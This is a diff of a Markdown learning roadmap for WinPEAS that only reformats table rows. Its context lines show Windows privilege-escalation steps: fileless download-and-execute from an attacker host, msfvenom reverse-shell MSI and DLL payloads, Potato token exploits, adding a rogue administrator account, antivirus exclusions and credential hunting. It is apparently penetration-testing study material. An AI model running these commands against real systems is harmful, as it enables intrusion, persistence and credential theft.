@@ -21,17 +21,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]]
 
 | Pivoting & Tunneling | Post-Exploitation & PrivEsc | C2 Frameworks | Network Relays |
-|:---------------------|:----------------------------|:--------------|:---------------|
+| :--------------------- | :---------------------------- | :-------------- | :--------------- |
 | [[Chisel\|🔀 Chisel]] | [[LinPEAS\|🐉 LinPEAS]] | [[Sliver\|🐍 Sliver]] | [[Netcat\|🔌 Netcat]] |
 | [[Ligolo-ng\|🔀 Ligolo-ng]] | **🪟 WinPEAS** (you are here) | [[Havoc\|⚔️ Havoc]] | [[socat\|🔄 socat]] |
-| | [[Mimikatz\|🐱 Mimikatz]] | [[Mythic\|🏛️ Mythic]] | [[Metasploit_Framework\|💀 Metasploit]] |
+|| [[Mimikatz\|🐱 Mimikatz]] | [[Mythic\|🏛️ Mythic]] | [[Metasploit_Framework\|💀 Metasploit]] |
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals | 5 | 2–3 hours |
 | 2 | Running WinPEAS | 4 | 2–3 hours |
 | 3 | Reading the Output | 5 | 3–5 hours |
@@ -40,7 +40,7 @@
 | 6 | Manual Verification | 3 | 2–3 hours |
 | 7 | Practical Labs | 4 | 5–8 hours |
 | 8 | Mastery Challenges | 3 | 3–5 hours |
-| | **Total** | **32** | **~23–36 hours** |
+|| **Total** | **32** | **~23–36 hours** |
 
 **Prerequisites:** Basic Windows command line. Understanding of Windows services, registry, and permissions model. A foothold on a Windows machine (any user — WinPEAS works as a low-priv user, though some checks require admin).
 
@@ -55,7 +55,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Service Exploits** | Misconfigured service permissions, unquoted service paths, weak service binary paths. |
 | **Registry** | AlwaysInstallElevated (MSI files run as SYSTEM). AutoRun keys writable by low-priv users. |
 | **Scheduled Tasks** | Task binary writable by low-priv user. Task runs as SYSTEM or higher privilege. |
@@ -71,7 +71,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **winPEASx64.exe** | 64-bit compiled binary. Most common. Use on 64-bit systems. |
 | **winPEASx86.exe** | 32-bit binary. Use when targeting 32-bit processes or older systems. |
 | **winPEASany.exe** | .NET any CPU — runs on both. Larger. |
@@ -85,7 +85,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **HTTP Server** | `python3 -m http.server 8080` on Kali. On target: `certutil -urlcache -split -f http://kali_ip:8080/winPEASx64.exe winpeas.exe`. Or PowerShell: `IWR http://kali_ip:8080/winPEASx64.exe -OutFile winpeas.exe`. |
 | **SMB Server** | `impacket-smbserver share $(pwd) -smb2support`. On target: `copy \\kali_ip\share\winPEASx64.exe .`. |
 | **Paste** | Base64 encode on Kali → paste into PowerShell → decode to file. For air-gapped situations. |
@@ -97,7 +97,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Writable Dirs** | `C:\Windows\Temp\`. `C:\Users\<user>\AppData\Local\Temp\`. Upload here. |
 | **AV Note** | AV often scans `Temp`. Consider: `C:\ProgramData\` or a custom directory if AV is active. |
 | **In Memory** | `IEX (New-Object Net.WebClient).DownloadString('http://kali/winPEASx64.exe')` — doesn't touch disk (for .NET-based). Not reliable for binary EXE. |
@@ -109,7 +109,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **LinPEAS** | Same project — LinPEAS for Linux. Same color coding system. Same output structure. |
 | **Same Workflow** | Learn WinPEAS output → LinPEAS output is intuitive by comparison. |
 | **Color Code** | Red/Yellow = high probability escalation path. Green = interesting but lower priority. Blue = informational. |
@@ -125,7 +125,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `.\winPEASx64.exe` — full run, all checks. Takes 2–5 minutes. |
 | **Redirect Output** | `.\winPEASx64.exe | Out-File -Encoding ascii winpeas_output.txt`. Transfer back to Kali for offline review. `.\winPEASx64.exe > winpeas.txt 2>&1`. |
 | **Wait** | Don't interrupt. Let it finish. Incomplete runs miss checks. |
@@ -137,7 +137,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Specific Check** | `.\winPEASx64.exe systeminfo` — only system info. `.\winPEASx64.exe servicesinfo` — only service checks. `.\winPEASx64.exe windowscreds` — only credential checks. |
 | **All Categories** | `.\winPEASx64.exe help` — lists all available categories. |
 | **Fast Run** | `.\winPEASx64.exe fast` — skips slow checks (network, some registry scans). Good when time is limited. |
@@ -149,7 +149,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **PowerShell** | Preferred. Color output works well. `.\winPEASx64.exe` from PS. |
 | **CMD** | Works but color may not render. `winPEASx64.exe > output.txt` still captures all results. |
 | **Execution Policy** | If PS blocks: `powershell -ep bypass -c ".\winPEASx64.exe"`. |
@@ -161,7 +161,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Transfer** | SCP the output file to Kali. `scp user@target:C:/Windows/Temp/winpeas.txt .`. |
 | **Grep** | `grep -i "red\|high\|vuln\|password\|cred\|VULNERABLE" winpeas.txt`. |
 | **Sections** | Output is divided into clearly labeled sections. Search for specific section headers: `grep -i "services\|credentials\|token\|registry" winpeas.txt`. |
@@ -177,7 +177,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **OS Version** | Windows Server 2019 / Windows 10 1903 etc. → check against known kernel exploits (only as last resort). |
 | **Hotfixes** | List of applied patches. Missing hotfixes + known CVEs → check `windows-exploit-suggester`. |
 | **Architecture** | 32/64-bit. Affects which exploit binaries to use. |
@@ -191,7 +191,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Token Privileges** | WinPEAS highlights dangerous privileges in red: `SeImpersonatePrivilege` → PrintSpoofer, GodPotato, RoguePotato. `SeBackupPrivilege` → read SAM, SYSTEM registry hives → extract all local hashes. `SeDebugPrivilege` → inject into SYSTEM processes → dump credentials. `SeLoadDriverPrivilege` → load malicious kernel driver. |
 | **Check Manually** | `whoami /priv` — verify the output. |
 
@@ -202,7 +202,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Unquoted Path** | Service path without quotes containing spaces: `C:\Program Files\My App\service.exe`. Windows tries: `C:\Program.exe`, `C:\Program Files\My.exe`, then the full path. Plant executable in writable location earlier in the path. |
 | **Writable Binary** | Service binary that low-priv user can overwrite. Replace with malicious binary. |
 | **Writable Config** | Service config (registry) that low-priv user can modify. Change binary path. |
@@ -215,7 +215,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Windows Vault** | WinPEAS dumps Windows Credential Manager entries. May contain network credentials, web credentials. |
 | **Registry Passwords** | AutoLogon registry keys: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` — DefaultUserName, DefaultPassword. |
 | **Unattend Files** | `unattend.xml`, `sysprep.xml` — Windows installation answer files. Often contain base64-encoded admin passwords. WinPEAS searches common locations. |
@@ -229,7 +229,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Scheduled Tasks** | Tasks running as SYSTEM with binaries writable by low-priv user. WinPEAS flags these. Verify: `schtasks /query /fo LIST /v | findstr "Task\|Run As\|Task To Run"`. |
 | **AlwaysInstallElevated** | Registry key: `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1` AND `HKLM\...`. If both set: create malicious MSI → runs as SYSTEM. |
 | **AutoRun** | Writable AutoRun registry entries. Replace the binary path with malicious executable. |
@@ -245,7 +245,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Who Has It** | IIS AppPool accounts, SQL Server service accounts, network service accounts. Very common. |
 | **Exploit** | PrintSpoofer: `.\PrintSpoofer.exe -i -c cmd`. GodPotato: `.\GodPotato.exe -cmd "cmd /c whoami"`. RoguePotato, SweetPotato: alternatives. |
 | **Result** | SYSTEM shell. Immediate full system compromise. |
@@ -257,7 +257,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Find** | WinPEAS flags unquoted paths. Verify: `wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'`. |
 | **Check Writable** | Can you write to the parent directory? `icacls "C:\Program Files"`. |
 | **Exploit** | Plant `C:\Program.exe` (reverse shell). Wait for service restart or restart it: `sc stop ServiceName; sc start ServiceName`. |
@@ -269,7 +269,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Find** | WinPEAS: services section with writable binaries. Verify: `icacls "C:\path\service.exe"`. |
 | **Exploit** | Backup original. Replace with malicious binary (reverse shell, add admin user). Restart service. |
 | **Add Admin User** | `cmd.exe /c net user hacker P@ss123 /add && net localgroup administrators hacker /add`. |
@@ -281,7 +281,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Check** | WinPEAS flags this. Manual: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`. |
 | **Exploit** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali LPORT=4444 -f msi > shell.msi`. `msiexec /quiet /qn /i shell.msi` → SYSTEM shell. |
 
@@ -292,7 +292,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Find** | Procmon on the target: filter CreateFile + NAME NOT FOUND + ends with .dll. Find privileged processes missing DLLs. |
 | **Check Writable** | Is the directory where the DLL is searched for writable? `icacls "C:\path\"`. |
 | **Exploit** | Generate malicious DLL: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali LPORT=4444 -f dll > missing.dll`. Place in the writable directory. Restart the service/process. |
@@ -308,7 +308,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Problem** | WinPEAS is flagged by Windows Defender and most AV. |
 | **Options** | Use the .bat version (less detections). Compile WinPEAS from source with modifications (strings changed). Use obfuscation tools. Run manual enumeration commands instead. |
 | **Exclusion** | If you have admin: `Add-MpPreference -ExclusionPath "C:\Temp"` → add AV exclusion → run WinPEAS. But you need admin first. |
@@ -320,7 +320,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **System Info** | `systeminfo`. `whoami /priv`. `whoami /groups`. |
 | **Services** | `sc query`. `wmic service get name,pathname,startmode`. |
 | **Scheduled Tasks** | `schtasks /query /fo LIST /v`. |
@@ -334,7 +334,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **PowerUp** | PowerShell script. `Import-Module .\PowerUp.ps1; Invoke-AllChecks`. Similar to WinPEAS but PS-based. Often less detected. |
 | **Seatbelt** | C# tool for detailed enumeration. More stealthy than WinPEAS. Specific category checks. |
 | **PrivescCheck** | PowerShell script. Good alternative. `.\PrivescCheck.ps1 -Extended`. |
@@ -350,7 +350,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Rule** | WinPEAS flags potential issues. Not every flag is exploitable. Always manually verify before spending time on exploitation. |
 | **Service** | WinPEAS says service binary writable → `icacls "path"` → confirm you have write permission → confirm service runs as SYSTEM → then exploit. |
 | **Credential** | WinPEAS finds autologon password → `reg query HKLM\...Winlogon` → confirm it's there → try the credential. |
@@ -362,7 +362,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **LOLBAS** | `lolbas-project.github.io` — Living Off the Land Binaries, Scripts and Libraries. Windows binaries that can be abused for privilege escalation, execution, download. |
 | **GTFOBins** | `gtfobins.github.io` — Unix binaries (relevant for WSL or if Linux is in scope). |
 | **Cross-reference** | WinPEAS finds an interesting binary → check LOLBAS for escalation techniques. |
@@ -374,7 +374,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Check** | `whoami /priv` — list all token privileges and their states. `Enabled` = active. `Disabled` = present but not yet enabled (can be enabled programmatically). |
 | **Enable** | Some tools (Potato exploits) enable privileges automatically. |
 
@@ -454,7 +454,7 @@
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can transfer and run WinPEAS on a Windows target | ☐ |
 | Can read and prioritize WinPEAS color-coded output | ☐ |
 | Can identify and exploit SeImpersonatePrivilege | ☐ |
